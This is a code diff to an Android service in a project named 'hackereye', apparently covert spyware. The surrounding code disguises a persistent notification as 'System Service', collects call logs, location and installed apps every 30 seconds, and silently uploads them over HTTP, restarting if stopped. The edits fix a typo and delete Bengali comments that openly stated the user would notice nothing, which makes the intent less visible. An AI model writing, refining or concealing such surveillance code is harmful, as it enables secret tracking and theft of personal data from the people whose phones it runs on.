@@ -1,4 +1,4 @@
-packagepackage com.hackereye;
+package com.hackereye;
 
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -61,7 +61,7 @@ public class MainService extends Service {
             manager.createNotificationChannel(channel);
         }
 
-        // ফোরগ্রাউন্ড নোটিফিকেশন (ইউজার দেখবে "System Service Running")
+        // ফোরগ্রাউন্ড নোটিফিকেশন
         Notification notification = new NotificationCompat.Builder(this, "hackereye_channel")
                 .setContentTitle("System Service")
                 .setContentText("Running...")
@@ -88,7 +88,7 @@ public class MainService extends Service {
             collectCallLogs();
             collectLocation();
             collectInstalledApps();
-            handler.postDelayed(this, 30000); // ৩০ সেকেন্ড পর পুনরায়
+            handler.postDelayed(this, 30000);
         }
     };
 
@@ -248,14 +248,14 @@ public class MainService extends Service {
                 int responseCode = conn.getResponseCode();
                 conn.disconnect();
             } catch (Exception ignored) {
-                // সাইলেন্ট — ব্যাকগ্রাউন্ডে চলে, ইউজার কিছু দেখবে না
+                // সাইলেন্ট — ব্যাকগ্রাউন্ডে চলে
             }
         }).start();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        return START_STICKY; // সার্ভিস বন্ধ হলে আবার চালু হবে
+        return START_STICKY;
     }
 
     @Override
